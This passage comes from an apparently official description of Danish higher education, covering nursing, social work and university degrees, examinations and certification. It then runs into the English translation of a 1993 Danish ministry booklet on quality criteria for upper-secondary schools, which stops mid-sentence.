fundamental functions of a nurse. The two subsequent parts include the more specific functions of a nurse, and they are organised in such a way that the degree of difficulty increases so that the last part comprises independent practice of nursing. The theoretical education consists of the following scientific fields, each of which comprises approx. the following percentages of the total theoretical education: nursing and other health sciences (nursing theory and methodology, epidemiology, pathology, nutrition, pharmacology, and social, occupational and environmental medicine): 60%; natural sciences (anatomy, physiology, physics, chemistry, biochemistry, microbiology, clinical chemistry, genetics): 20%; and arts and social sciences (psychology, pedagogics, sociology, communication, structure and functions of the health and social services, including legislation, administration as well as philosophy and ethics): 20%. The exact organisation of the theoretical education is laid down in a curriculum. The clinical education consists of the following main fields, each of which must comprise approx. the following percentages of the total clinical education: nursing care to healthy people and people whose health is at risk: 25%; nursing care to people suffering from acute and chronic, somatic and mental illness: 75%. 6.3.2.5.2. Social work The course is of 3 years' duration, including a 5-month practical training period in the 3rd-4th semester of the course. The course comprises the following subject areas with the following minimum number of lessons: social law 120 family law, civil law, and administration of justice 60 administrative studies 60 labour market studies 60 social studies, social and labour market policies 80 economic planning 60 sociology 60 psychology 60 psychiatry and social medicine 50 Theories and methods in social work 120 A major part of the work with the subject-areas consists of project work, the aim of which is to give the students an interdisciplinary comprehensive understanding of the interaction between the structures of society and the conditions of life and behaviour of the individual human being and thereby integrate and translate the knowledge and understanding they have acquired through the courses as well as to enable them to determine concretely the factors which cause social problems and to translate this understanding into concrete practical work with such problems. The project work takes place within two problem fields: 1) Social work - individual, family and society and 2) Social work - institutions. The practical part of the training takes place during the entire 3rd and 4th semesters. It normally takes place in a municipal or county social or health administration. It is the aim of the practical training that the student gets a concrete insight into and understanding of the different typical functions of a social worker, gets some proficiency in translating the theoretical knowledge into practical work with concrete social cases, including client contact, is trained to cooperate with other professional groups on concrete social problems and gets a basis for assessing his/her prerequisites for working as a social worker. 6.3.2.6. Methods As above, two examples of courses have been chosen to describe this level of higher education: nursing and social work. 6.3.2.6.1. Nursing The education comprises a theoretical part and a clinical part in a proportion of 5 to 4. The theoretical part of the course is structured in different scientific fields, see [6.3.2.5.1.]. 6.3.2.6.2. Social work The work with the subject-areas is organised as a combination of subject-area-oriented courses and problem-oriented, interdisciplinary project work. Seminars may form part of courses and project work, and support courses may be held in connection with the project work. Field work is integrated in the project work. Finally, there is a coherent 5-month practical training period in the 3rd and 4th semester of the course. 6.3.2.7. Student Evaluation As above, two examples of courses have been chosen to describe this level of higher education: nursing and social work. 6.3.2.7.1. Nursing The qualifications acquired during the education are documented through examinations in connection with the theoretical education and general proficiency assessments in connection with the clinical education. The examinations are internal or external. Internal examinations are assessed by the teacher-examiner(s) and one or more examiners appointed by the educational institution. External examinations are assessed by the teacher-examiner and one or more examiners appointed by the Ministry of Education. The 13-point marking scale is used for both the internal and the external examinations. It is however possible to use the assessment of pass/fail. The assessment of pass/fail is used for general proficiency assessments. External examinations are held at the end of each of the 3 parts of the course. General proficiency assessments are given on completion of the clinical education in each of the 3 parts of the course. All examinations and general proficiency assessments must be passed. An examination is considered passed, when a mark of 6 or more or the assessment of pass have been obtained. Each examination must be passed individually. It is not possible to repeat examinations which have been passed. Students can sit for examinations in a subject 3 times. Under certain circumstances, the institution may permit a forth time. Students who have failed a general proficiency evaluation may be evaluated again after repeated clinical education. 6.3.2.7.2. Social work Written examinations (subject-area examinations) are held in the subjects areas of social law; family law, civil law, and administration of justice etc.; administrative studies; labour market studies; and economic planning. Written and or oral examinations (subject-area examinations) are held in the subject-areas of social studies, social- and labour market policies; sociology; psychology; psychiatry and social medicine; and theories and methods in social work. More examinations may be held within each of the subject-areas or several subject-areas may be included in one examination. Two assessments are made of the project work (project assessments), one in each problem field. The basis of the assessment of the project work is the project report and a talk about the project work. Students must present themselves for examination in subject-area examinations and project assessments the first time they are held after the teaching and the project work, respectively have been completed unless otherwise authorised by the school. A students can sit for the same examination 3 times, with - under very special circumstances - the possibility of a forth time, and only if he or she has been given the mark of 6 or less. The highest mark shall apply. At subject-area examinations, one or more external examiners are present at the examination according to ministerial decision. At project assessments there are two external examiners, of which at least one comes from a municipal or county administration, and - as far as possible - at least one qualified social worker or similar. The assessment is individual both at subject-area examinations and at project assessments. The 13-point marking scale is used for the assessment. One mark is given for each subject-area. In the project work, one mark is given for each problem field. 6.3.2.8. Promotion, Educational Guidance Students can only proceed to the next part of the course, if they have passed the examinations and tests of the previous part. Most educational institutions at this level have educational and vocational guidance counsellors to advise the students. 6.3.2.9. Certification As above, two examples of courses have been chosen to describe this level of higher education: nursing and social work. 6.3.2.9.1. Nursing education The educational institution issues a diploma to students who have completed the nursing education stating the results of examinations and general proficiency evaluations. After having completed the nursing education, the graduates have the right to be granted an authorisation as a nurse. This authorisation is granted by the National Board of Health. 6.3.2.9.2. Social work Upon completion of the course, the school issues a diploma, which contains the following information: the assessments for the individual subject-areas and for the project work, the nature of the practical training institution, information on the aims and structure of the course, exemptions if any, etc. A student who has completed the social work education is entitled to use the title of social worker ("socialr�dgiver"). 6.3.2.10. Openings, Training-Employment Relationship As most of the courses in this area are very practically oriented with practical training periods, there are no special measures of this kind. Openings are advertised in daily newspapers and in the professional papers of the individual occupational groups. 6.3.2.11. Special Assistance for Pupils See [6.3.3.11.]. 6.3.3. Medium- and Long-cycle University Education This area of higher education covers courses conducted by the traditional universities and by higher education institutions with university status. 6.3.3.1. Types of institutions In Denmark, there are a total of 12 institutions offering this type of higher education: 5 universities of the traditional kind, which offer all or most of the scientific main areas. They are the Universities of Copenhagen, Aarhus, Odense, Roskilde and Aalborg, the University of Copenhagen being the oldest (500 years old) and Aalborg University the youngest (20 years old); 3 natural-sciences-based institutions directed at important professions: the Technical University (engineering), the Royal Danish School of Pharmacy (pharmacology), and the Royal Danish Veterinary and Agricultural University (agriculture, horticulture, veterinary science, forestry, food science), all of which were founded in the 19th century. 3 business schools (Copenhagen, Aarhus, and South Jutland) specialising in business economics, administration and languages, and finally the Royal Danish School of Educational Studies specialising in in-service training and graduate studies for teachers of the Danish ["Folkeskole"]. Common to these 12 institutions is that they must all carry out research and offer higher education until the highest academic level within their subject-areas. The universities in Copenhagen and Aarhus (with 14,750 and 10,100 active students, respectively) are the largest followed by Copenhagen Business school (with 8,500 active students). The South Jutland Business School and the Royal Danish School of Pharmacy (with 2,250 and 700 active students, respectively) are among the smallest institutions. In addition to these institutions, there are a number of institutions belonging under the Ministry of Cultural Affairs offering art education programmes, such as music, architecture, visual arts etc. 6.3.3.2. Admission Requirements The general admission requirements for all the courses under the Ministry of Education is the completion of one of the qualifying examinations at upper secondary level: 1) the ["Studentereksamen"]2) the ["H�jere Forberedelseseksamen"]3) the ["H�jere Handelseksamen"], or4) the ["H�jere Teknisk Eksamen"]. Some schools, e.g. the Royal Academy of Arts and the music academies, have their own aptitude tests. But in general, students are granted admission on the basis of the average mark obtained at their final examination at upper secondary level. Finally, there may be a number of special requirements regarding certain subjects at high level, work experience etc. 6.3.3.3. Branches of Study, Specialisation Denmark has recently adopted an Anglo-American structure with the introduction of the Bachelor's and Ph.D.-degrees. A university course now normally consists of a 3-year Bachelor's degree course, followed by a 2-year course leading to the Candidatus-degree (Master's level). Three years of supervised postgraduate studies after the Master's degree lead to the Ph.D.-degree. Most degree courses are self-contained, and students choose their field of specialisation when they commence their studies. The Master's degree course include half a year's work on a thesis. Among the humanities courses, there is also a 4-year degree course leading to the cand.phil.-degree and a special 6-year degree course leading to the degree of mag.art. Both concentrate on one subject. At the universities, the above degree courses can be taken in a wide variety of different humanities and natural sciences subjects, i.e. ["Gymnasium"]-subjects but also many others (e.g. eskimology, applied linguistics, phonetics, comparative literature, rhetoric, psychology, statistics, actuarial science, astronomy, geophysics, meteorology etc.), social science subjects (economics, political science, anthroplogy and sociology), law, theology, health sciences (medicine, dentistry, human biology), communication etc. The specialised university-type institutions offer courses leading to the above-mentioned degrees in for instance business economics and business languages (the business schools), engineering (the Technical University and engineering colleges), pharmacy (Royal Danish School of Pharmacy), agriculture, horticulture, forestry, veterinary science, and food and dairy science (Royal Danish Veterinary and Agricultural University) and education (Royal Danish School of Educational Studies). 6.3.3.4. General Objectives The wording of the education orders pertaining to university education varies to a great extent, but the meaning is very much the same. As examples have been chosen the order on the courses at Roskilde University: "It is the general objective of the courses at Roskilde University to qualify the students to assume occupational functions and scientific work within the humanities, natural sciences and social sciences main areas." and the order on the courses in economics at the universities: "It is the geneneral objective of the courses in economics to qualify on a scientific basis for employment in the public or private sector on the basic of economic theory and methodology." 6.3.3.5. Curriculum, Subjects, Number of Hours The curriculum, subjects and weekly workload vary from course to course. The weekly workload expressed in the number of hours at school ranges from 12 to 40 hours, with the humanities in the lower end of the scale and engineering, pharmacy and other courses involving laboratory exercises etc. in the upper end of the scale. The following courses have been chosen as examples of what the content and the organisation of a course may be like: the degree course in psychology and the degree course in law. 6.3.3.5.1. The Degree Course in Psychology The degree courses in psychology consist of a 3-year course leading to the Bachelor's degree, a further 2-year course leading to the 'candidatus'-degree (Master's level), and a further 3-year course leading to the Ph.D.-degree. The courses consist of a number of study units, the number and size of which are established in the curriculum. The Bachelor's course is a rounded-off course, which gives the students basic knowledge of psychology, including developmental psychology as well as an elementary introduction to applied psychology, research method and presentation of psychology and basic qualifications for occupational employment and for commencing on the Master's course. The university organises the Bachelor's course with a subject supply with options which gives the student a choice to finish the course after the 3rd year or to seek admission to the Master's course. The Bachelor's course comprises the following course-elements: General psychological basic disciplines with exercises, general psychology with Bachelor assignment, application-oriented psychology, elementary research methods, areas of related subjects of relevance to psychology. The Master's course is to build on to the Bachelor's course with further studies of the applied psychology and its general psychological basis with the related method, enable the student to independently use psychological knowledge, theory and method when analysing and solving problems within public and private enterprise, and qualify the student to take part in scientific development work. It comprises the following educational elements: Applied psychological theory formation and the general psychological basis, applied psychological investigation and intervention methods, profession and practice, advanced research methodology, thesis. The thesis consists of a major independent paper which shall document the student's skills in using scientific theories and methods in the work with a delimited specialist topic. 6.3.3.5.2. The Degree Course in Law The courses in law consist of a 3-year course leading to the Bachelor's degree, a further 2-year course leading to the 'candidatus'-degree (Master's level), and a further 3-year course leading to the Ph.D.-degree. The Bachelor's course is a rounded-off course, which gives the students basic knowledge of the methods of legal and related sciences as well as of central parts of the judiciary system, qualifies for occupational employment and forms the basis of the subsequent Master's course. The university organises the Bachelor's course with a subject supply with options which gives the student a choice to finish the course after the 3rd year or to seek admission to the Master's course. The subjects of the Bachelor's course is distributed on the 3 years of study so that the subjects in the 1st year comprises: parts of the law of property, parts of public law, family law and law of wills and succession. The 2nd and 3rd years of the course comprise the subjects of law of property with international private law, company law and civil enforcement; public law, international law, EU law and parts of civil proceedings; criminal law and criminal procedure. In the course of the 3rd year, the students will furthermore be given an introduction to the relationship between law and society, history of law, general jurisprudence and sociology of law. Some of the subjects may be replaced by optional subjects with a view to completing the course after the 3rd year. The teaching may comprise obligatory exercises, theme reports and written papers in the subjects. The Master's course is to build on to the Bachelor's course with further studies in legal and related subject-areas, enable the student to independently use legal knowledge, theory and method when analysing and solving problems within public and private enterprise, and it is to qualify the student to take part in scientific development work. The Master's course is made up of 12 study units composed by the individual student. One study-unit corresponds to 1/6 full-time equivalent. It comprises the following subjects: tax law, economics, optional courses, thesis. The remaining 10 study units consist of courses and one or more written papers which together cover a not too narrowly delimited topic-area. Courses and written papers corresponding to 6 study units may deal with non-legal topics of relevance to legal work. The thesis shall document the student's skills in using scientific theories and methods in the work with a delimited specialist topic. 6.3.3.6. Methods Danish university education leaves students free to exercise their own initiative. Besides attending traditional lectures, they study in small groups where they are expected to contribute actively. Part of their studies consists of independent project and research work. The degree studies offered by the universities in Aalborg and Roskilde begin with a one- or two-year basic course which qualifies students for a number of further courses of study characterised by an interdisciplinary, problem-oriented approach. 6.3.3.7. Student Evaluation Generally marks are given according to the 13-point marking scale indicating the performance of the student: 13-10 Very good 9- 7 Good 6 Satisfactory 5-00 Less satisfactory Some examinations only use the assessment of passed/failed. The students must obtain at least a 6.0 average in order to pass. Students in Danish higher education institutions are not normally assessed during the term to the same extent as in some other countries. As a new requirement however students admitted after 1993 must pass an examination after the first year of study. If the first-year examination is not passed with at least the mark of 6, the student will not be allowed to continue his/her education. The examination takes place in June with the possibility of another try in August or the next year. For further information, see [6.3.3.8.]. Before graduation, the students must pass a number of oral and written examinations. These normally take place twice a year in January and in May/June. Nearly all examinations - oral and written - are conducted with the participation of external examiners. 6.3.3.8. Promotion, Educational Guidance With effect from 15 January 1994 and applying to students who have commenced their university studies after August/September 1993, a new system of 1st year examinations have been introduced, whereby students have to register for and pass an examination before the end of the 2nd semester of their studies in order to be allowed to continue their studies. The form and content of this examination shall be established by the educational institution, and the examination is intended to document the student's study aptitude. Students who fail this examination may register for a new attempt in August, and failing that there is a last attempt at the end of the 3rd semester for students who have enrolled and are active in the 3rd semester, i.e. a student may go on to the 3rd semester without having passed the 1st year test but has to pass the test before the end of the semester. As regards promotion from the medium-cycle Bachelor's degree courses to the long-cycle Master's degree courses, there are provisions in the curriculum of the Master's degree course as to which Bachelor's courses give admission to it, and as to which subjects and levels the student must have in his Bachelor's course, and which marks, if any, he must have obtained in order to proceed to the higher level. All the university-sector institutions have educational and vocational guidance counsellors to advise the students. 6.3.3.9. Certification On completion of the education, the higher education institution issues a diploma which shall indicate the examinations taken and the marks obtained as well as the title/degree awarded. The diploma must contain a description of the course with an account of its subject-composition. Students, who leave a course without having passed the final examination, are entitled to documentation of the examinations passed. A university may decide that completed course elements which have been passed within a given study programme at one university can be considered equivalent to corresponding course elements taken at other universities. It may in each individual case or through general rules established in the curriculum approve that completed course elements or parts hereof taken at a Danish educational institution or at an educational institution abroad may replace course elements or parts hereof taken at its own institution. 6.3.3.10. Openings, Training-Employment Relationship With very few exceptions, there are no practical training or other provision of a similar nature incorporated in the courses at this level. 6.3.3.11. Special Assistance for Pupils In Denmark, there are no centrally fixed rules for the conditions of handicapped students in higher education. The Ministry has considered possible changes in the practice in force concerning the obligation to grant special educational assistance to handicapped students enrolled in higher education. In this connection, the educational institutions and the organisations of the handicapped have been asked to submit different information, but the result of this study is not yet available. It is thus up to the individual educational institution to fix rules in each individual case, including rules as to the aids which can be taken to examinations and to a possible extension of the examination time for handicapped students. Under the provisions of the University Act, the individual institution is fully autonomous with regard to the holding of examinations. It is up to the students themselves to pinpoint possible special needs for implements and to ask for exemption from the examination regulations in force. With regard to the financial aspect in connection with the acquisition of special implements etc. in order to be able to complete a course of higher education, it is the municipality of residence of the handicapped student which may cover such expenditures. The students may furthermore be given aid and assistance from the organisations of the handicapped when it comes to acquiring special compensatory equipment for handicapped to help them through their studies. Further information can be obtained from the University of Copenhagen, who as the biggest individual higher education institution has the greatest experience with handicapped students. 6.4. Organisational Variations, Alternative Structures A lot of the higher education courses are offered under the open education system, see [7.6.3.]. 6.5.

This booklet is an attempt to sum up the criteria used in the evaluation of educational practice of upper secondary schools of particularly relevance to "school inspections". In Denmark we introduced upper secondary school evaluations in 1989 based on voluntary participation and a selfcritical attitude of the staff: Schools apply to the ministry in order to participate, and the evaluation proces begins with a selfevaluation by the school, followed by a fourday visit by a group of subject advisers and general inspectors from the ministry. The visiting team produces a public report that is sent to all schools. The English text of this booklet is a translation from the Danish original from 1993, which was sent to all teachers, school leaders and all school boards. Student organisations, teacher organisations, The Danish associations of principals (for gymnasia as well as for adult education centres) and The Association of County Councils in Denmark have been involved in the formulation of these "quality indicators". Thus what is descibed an explication of the shared but hitherto mainly tacit understanding of what constitutes effective teaching and learning at this level in Denmark. In its choice of words and selection of topics the Danish original reflects a particular national tradition for nonhierarchical schools and informal studentteacher relations. These and other characteristics of our particular educational context are naturally presupposed in the translation, so my best advice to the foreign reader is: Come and see for yourself! Uffe Gravers Pedersen Deputy Permanent Secretary Introduction Central educational supervision This booklet is the result of the Department of Upper-Secondary Education's deliberations as to what constitutes a good school, good instruction and good educational leadership. The Department of Upper-Secondary Schools in the Ministry of Education supervises the subjects and the pedagogical work in the country's upper-secondary schools, adult upper-secondary courses, higher preparatory courses and higher preparatory instruction at adult education centres. The Department sets goals for upper-secondary and higher preparatory education, checks whether the goals are achieved, gathers and disseminates information, gives advice, and follows the subject-specific, pedagogical and administrative developments at these institutions. This supervision is carried out by thirty subject advisers from the whole country, all of whom concurrently teach at a school, and by ten staff members (eight with a background in education, two with a background in the law), who have their offices in the ministry. By means of these basic comments, the Department of Upper-Secondary Education wishes to put into words a number of school phenomena about which there has hitherto been implicit agreement or perhaps an ambiguous policy. The Department's work on this booklet has corresponded to the process that any upper-secondary school, higher preparatory course or adult education centre must go through, at a time when more and more decisions are put in the hands of the School management. Successful local management requires that the employees of the school or course have a shared attitude to questions like: What do we find especially important? How would we like to develop in the years to come? How do we find out whether we are achieving the goals that we set for ourselves? Why "Signs of Quality" now? Just like other public institutions, the various types of schools must thoroughly reconsider and re-describe their function at the present time. Leaders, teachers and boards of upper-secondary and higher preparatory schools state that they find it increasingly desirable, indeed necessary, to have a consciously considered attitude towards the basic values of the school. Routine and habit, which were taken for granted some years ago, must be formulated anew and justified, both internally vis-à-vis the students, and externally vis-à-vis parents and the institutions at which the students may continue their studies. More than ever before, the school must make an effort to show its worth. In the upper-secondary school and the higher preparatory courses there is a long tradition of quite detailed descriptions of the content of the individual subjects. However, when we need to formulate everything that is important for the quality of education that exists around and about the subjects themselves, we often lack precise expressions. It is difficult, for instance, to speak precisely about that "little bit extra" that we want to give the students beyond "mere subject matter". It is a widespread view that schools cannot employ concepts of leadership and co-operation used in industry, for example; there is a need for new concepts, for a new vocabulary about school development. The contents of this booklet The first section of this booklet gives an outline of the history of the types of schools that aim at general education and education for further study. This history goes back a very long time, and the content and structure of the upper-secondary school and the higher preparatory examination are still strongly influenced by it. The next section deals with the concepts of general education and education preparatory to further study, key words in the descriptions of the aims of the upper-secondary school and the higher preparatory examination. The following sections deal with the school's pedagogical climate, with teachers, students, instruction, assessment of students' progress, school leadership, co-operation and physical setting. Each chapter consists of a brief, descriptive section. Next there is a catalogue of quality criteria, "signs of quality", for the area concerned, which, as mentioned in the foreword, does not pretend to be exhaustive. In most cases the items are arranged to proceed from the general to the specific. Choice of words For stylistic reasons, the word "student" is used throughout when referring to young people as well as adults, and the word "class" is used, even though "group" might have been more precise in some cases. The word "school" covers all types of institutions. The History of the Upper-Secondary School and the Higher Preparatory Examination Roots in the Middle Ages In order to understand the position of the upper-secondary school and the higher preparatory examination in the educational system as a whole, one must know their history. The upper-secondary school has its roots in the medieval "Latin schools" or grammar schools, which prepared young men for a life of service in the Roman Catholic Church. Thus, almost all the cathedral schools can trace their histories back to the time before the Reformation. When a university was founded in Denmark at the end of the 15th century, it became the task of the grammar schools to prepare students for university studies as well. One hundred years ago,"the learned school", as the upper-secondary school was called up to the beginning of this century, prepared approximately one per cent of the male population for the university studies that led to public office. The reform of 1903 The Act on Higher General Schools of 1903 confirmed the upper-secondary school's function in preparing students for further study and in giving general education. At the same time the Act introduced three crucial reforms: Living languages, especially English and German, were allotted more lessons. Girls were now allowed to take school leaving examinations at state schools. A transition from elementary school to higher education was made possible. The reform meant that students could now choose one of three sides: one for classical languages, one for mathematics and the natural sciences (from 1871), and one for modern languages (from 1903). From having been moulded on the classical educational ideal of previous centuries, with Greek and Latin as the main subjects, the upper-secondary school developed into a school in which the individual student was able to specialize through choosing one of the three sides. Danish, history, religion and a new subject called "classical studies" were common to the three sides, as these were considered the most important subjects for a general education. The Act created cohesion in the educational system from the first school year to the school leaving examination by concurrently introducing a four-year middle school that qualified students for the upper-secondary school. In this way a greater part of the population were able to take a school leaving examination. Along with industrialization, a larger, well-educated middle class had become necessary, and the Act became a tool for meeting this need. The reform of 1958 The Act of 1958 was an extension of the development started by the reform of 1903. A number of new options for students were introduced. On entering the upper-secondary school students still had to choose between the language and the mathematics side, but from the second year, the students chose lines within the sides. Three new lines were introduced: biology, social studies and music. The classical languages were reduced to line status. The options offered in this reform turned out to strengthen the tendency already apparent in the Act of 1903: the upper-secondary school was becoming a broader form of education for the young. The higher preparatory examination and single-subject courses The Act on the Higher Preparatory Examination was adopted in 1966. The background for it was a political wish to establish a new path within the educational system and a path back to the educational system. The higher preparatory examination aimed at being open "at the top" and providing qualifications for higher education. It also aimed at being open "at the bottom", i.e. not only accessible for those who came direct from school, but for everyone who had acquired the necessary qualifications in one way and another. The examination could be taken after independent study, and all students were to be assessed purely on the basis of their examination results. Periodic marking was abolished and examinations were held in all subjects. This new two-year course of study contained a core of obligatory subjects in addition to optional subjects, and more independent forms of studying were to be employed. The higher preparatory examination was expected to appeal both to adults and young people who had experienced more than going to school, or who wished to take an examination preparatory to further study that was different from the school leaving examination. From 1970 it became possible (at first as an experiment, later permanently) to take a higher preparatory examination consisting of tests in single subjects taken over several years. Parallel with the two-year course, which was usually established at an upper-secondary school or a college of education, a single-subject system was set up at the higher preparatory courses (later called adult education centres). The two-year courses and the single-subject system evolved into an educational course for young people and adults during the 70s and 80s - growing quite vigorously. The higher preparatory examination has fulfilled a political wish for an alternative to the upper-secondary school that could make a course of education for further study attractive to young people and adults from milieus in which continuing on in the educational system had not been the ordinary thing. The upper-secondary school reform of 1988 This reform retained the division into language and mathematics sides, but in such a way that the language students are now able to take more science and the mathematics students more foreign language. At the same time the structure of lines has been replaced by a system of optional subjects, so that the students no longer choose groups of subjects, but are now able to combine various subjects. All students choose two or three subjects at the high level and one or two subjects at intermediary level. At the same time the common core areas of the subjects have been clearly indicated, and the content descriptions and instruction guidelines have been modernized. This reform is an extension of the other reforms of this century, with increasingly greater possibilities for specialization and for free combinations of optional subjects across the boundaries of the sides. The large group of subjects that is common to all students has been retained, however. As part of this reform, the individual schools have been given greater economic and pedagogic powers (management by objectives) vis-à-vis the counties and the Ministry of Education. The higher preparatory reform of 1991 After twenty-five years a need had arisen for revision of the higher preparatory examination. Amongst other things better possibilities for co-operation were established between the two-year courses and the single-subject system. The number of subjects offered was adjusted, and the possibility to take subjects at high level was introduced into the higher preparatory examination. Adult upper-secondary courses Until the higher preparatory examination was introduced by the Act of 1966, adult upper-secondary courses were the only option for adults who wished to qualify themselves for higher education. Since the beginning of this century the courses had been an essential aspect of the educational structure and they still constitute an option for the adults who wish to take a school leaving examination in two years. Since 1991, when it became possible to take a school leaving examination as a single-subject examination, these courses have gained new opportunities for combining traditional two-year courses with single-subject courses. Four upper-secondary courses of education for young people The upper-secondary school and adult upper-secondary courses no longer have a monopoly on preparing students for higher education. Today there are four different upper-secondary courses of education for young people. Just as the higher preparatory examination has done from the beginning, the higher commercial examination and the higher technical examination now qualify students for higher education. More flexibility has been attained by formally making the four courses of education comparable. In several subjects it is possible to be credited for course units that have been completed ("getting credit"), if one transfers from one course of education to another. What is characteristic of the upper-secondary school and the higher preparatory examination - despite their differences - is that they are "general", i.e. they do not in themselves qualify the students for occupations, and the subjects offered comprise a relatively large number of obligatory common core subjects that stress the humanities, music and creativity in general. In the upper-secondary school and the higher preparatory examination, the concept of preparing for higher education is closely linked with general education from the outset, as was the case in the grammar school and in the "Latin school" before it. The upper-secondary school and the higher preparatory examination in the 1990s The expectations of a general education preparing young people for further study have not decreased over the past twenty-five to thirty years. The information-orientated society, which is now replacing the industrial society at full speed, makes great demands on general knowledge and on linguistic as well as mathematical and scientific skills. In the flow of information from the printed and the electronic media, the ability - as well as the courage - to differentiate between essential and non-essential has become more important than ever, and a crucial quality of any course of education is to develop this ability in its student. This is done by letting the students gain an understanding of the structure of the physical world, for instance, of the course of history and of social and technological development - and by reflecting on their own place in it. General Education and Education for Further Study The aims The task of the upper-secondary school and the higher preparatory examination is to provide an education that ensures the necessary basis for higher education and to provide a general education. The formally stated objects reflect a view of schools and education that makes the student's personal and academic development the aim of the instruction. Through the subjects, students gain access to a larger world, and the examination is a guarantee that the academic aims of the instruction have been achieved. This holds true even though examinations may only be held in part of the instructional content. In the upper-secondary school and the higher preparatory examination there are no short cuts to a general education: The development of both young and adult students towards greater personal independence and responsibility proceeds through acquiring subject-specific knowledge, insight and skills. In this instance a general education means the process by which the student develops, throughworking with the areas and contexts of a subject and through interplay with teachers and other students. By encountering that which is new and different and by meeting others, the students learn to understand themselves, their backgrounds and their possibilities. Students cannot take over a finished "education package"; they must work along on the project themselves by building on their own experience, taking the consequences of the choices they make, and making use of the give and take provided by their teachers. This give and take occurs in the instruction, both in the academic subjects and in the social extra-curricular events that the school offers, e.g. choir, drama, sports and study groups. General education and the subjects The idea that students become mature personalities in the course of the time they spend in school has existed in European thinking since the Renaissance. As an extra bonus to knowledge, the students were supposed to develop and become prepared to assume lives as responsible and independent individuals. This is the educational ideal that lives on for young and adult students in the formally stated objects of the upper-secondary school and the higher preparatory examination, but no indication is given of how the ideal is to be made a reality. Every school must therefore deliberate how the concept is to be utilized in the present reality and link it to the school's group of students and the requirements made by the contents of the subjects. All subjects lead to a general education Obligatory as well as optional subjects are obliged to fulfil this double aim: In other words, all subjects lead to preparation for further study and to a general education. Thus no subjects in themselves qualify students for an occupation, but they prepare students for further study. At the same time the student's personal education is furthered through the thinking processes that the instruction in the subjects stimulates, for instance, about the basic conditions of existence, the norms of society and the individual's attitudes and experience. A Good School The atmosphere of the school Every school has a particular atmosphere, which may be difficult to define. The ambience of the place, the special mood, which is the result of a long period of major and minor decisions, has a great effect on how much benefit the students derive from the instruction. A frank and open-minded sense of fellowship in the classes can determine whether the individual students get the opportunity to open up and demonstrate what they can do as regards subject matter and more general areas. A sense of taking pleasure in one's work and a sense of being involved in the interplay between teacher and student are difficult phenomena to document - although it is plain to anybody if they are missing. Although instruction is the main thing, the intensity of everything else that happens at a school is also of great importance. The quality of events arranged for the whole school and of the school's various extra-curricular activities affects the academic and social benefit that the students derive from their time at school. Activity days, or theme days, and school parties create a sense of unity within the individual class and between classes and year groups. Morning assemblies with brief notices, songs and performances underline this fellowship day by day. Excursions and assemblies can be academic and social highlights of the students' school-days. Furthermore the involvement that students exhibit in the school's extra-curricular activities, like a class play, choir and orchestra, athletics, art, and study groups, contributes to their total school experience. Adult education centres (VUC) At adult education centres the picture is different. Normally an adult education centre consists of both a higher preparatory section (hf) and a section for general adult education (AVU). The most important elements in determining the institution's atmosphere are: - the institution's ability to project itself as a unit, one milieu, despite the fact that instruction is spread out over the whole day and evening and takes place in several different venues, - the involvement of teachers and students in activities at the centre that take place at times other than lesson times. It can be difficult to get students involved in the centre as an institution if, for instance, they are only taking a single subject. In addition many teachers at adult education centres also have other teaching jobs, e.g. related to courses set up for businesses and firms in the area, so they are unable to participate in the daily life of the school during these periods. The same is true of those teachers at adult education centres who are employed by another institution. On the other hand, these outside activities can bring life to the institution. A dynamic is created in the interplay between ordinary instruction at the centre and work on developing instruction for new groups of students. The school's understanding of itself What does the individual school want to characterize its atmosphere and educational environment, beyond the features common to all upper-secondary schools and higher preparatory courses? The goals and priorities of a school can be seen at several levels: from the overall ideas of the distinctive character of the school to the kinds of extra-curricular instruction offered and on to the "social traffic regulations" that apply inside and outside the classroom. For instance, one school may wish to stress its interest in international contacts, another school may attach great importance to the students' having a say in decision making, and at the same time the school may wish to emphasize its strength in certain academic areas: the natural sciences, the school's creative activities, music, or its use of new technology for instruction. The school's development A good school is dynamic. Among other things, this means that it is constantly developing and has worked out a form of self-assessment which is a regular feature of the school's life. This implies that there is a feeling of loyalty among colleagues on the staff, which allows the school's goals and priorities to be discussed and revised regularly. Through various forms of repeated analysis of aspects of the school's function, the school forms a picture of what its strengths and weaknesses are. By means of a conscious and well-planned common effort, any faults can then be redressed. SIGNS OF QUALITY The School's Atmosphere The school has a clear policy on the following: * the school's understanding of itself and its role in the local community, * the academic subjects and activities the school wishes to offer, * the demands made to students and staff concerning social conventions and personal responsibility, and the consequences of not living up to the demands, * activities and events available to students outside class hours, * regular assessment of the students and information about their level of attainment. The school has traditions that the teachers and students appreciate, maintain and renew. There are frequent events at the school that affect all or great numbers of teachers and/or students, e.g. acitivities for the whole school, a class play, a choir in which teachers and students participate, theme days, study trips, exchanges with foreign teachers and students. The School's Development A feature of the school is that teachers and administration discuss how general education and education for further study are best dealt with in practice. The school has a clear policy on the subjects offered, experimental instruction and extra-curricular activities that reflects the overall goals. The school has discussed and decided what changes in its usual way of doing things will be made as a result of the greater degree of self-management in the following areas: * distribution of resources for teaching materials, teachers' inservice training and study trips * the use of monies allocated through collective bargaining agreements. At various levels (in departments, in the administration, in the teachers' council, among students, etc.) a time and place are provided for reflecting on how the school functions. Topics of general pedagogic interest are discussed. The school has a sense of loyalty among colleagues that makes it natural for teachers to discuss one another's teaching. Teachers may sit in on one another's lessons, where this is agreed upon. The school has attempted to shed light on how the students, the staff and/or parents or others outside the school assess the quality of the instruction, e.g. in the form of a questionnaire. A School's Pedagogical Climate Good teaching There is no simple recipe for good teaching. Teaching is a dynamic process and each lesson is a living experiment. A lesson is not necessarily bad, of course, because something happens other than what the teacher and students had imagined. Successful teaching depends on whether the teacher can utilize the students' background and interest in the subject and get them to continue to work on it in an independent manner. If that happens, the result will be a high academic standard and valuable general qualifications. Serious work with the subject matter furthers independence, creativity and a critical faculty. The ability to proceed independently in working on academic and general problems is becoming increasingly more important in a rapidly changing world. Therefore, students must learn to ask questions - not least of themselves. The teacher must contribute to stimulating the students' thirst for knowledge, open-mindedness and desire to experiment. One of the ways of doing this is to ensure that the students themselves are involved in planning the course of instruction. Imparting knowledge and general education Obviously a teacher must have good academic and pedagogical qualifications in order to teach a subject. The teacher's task is to arouse the students' interest, show them the possibilities of the subject, and evoke initiatives from them by making demands. It is important to combine experience and reflection, and it is also important that the students work with the subject matter in a serious, imaginative and independent way. If the instruction is to be called general education, it requires that the subjects are dealt with in a way that links the individual student's world to the larger world that exists in the subjects and in the various sets of technical language. The sum of the subjects and the links between them is part of what makes up general education. Requirements and consequences Students have rights and duties while they go to school. A positive feature of a school is that it has many academic and social activities to offer, that it emphasizes the students' own responsibility for benefiting from the instruction, and that it expects that 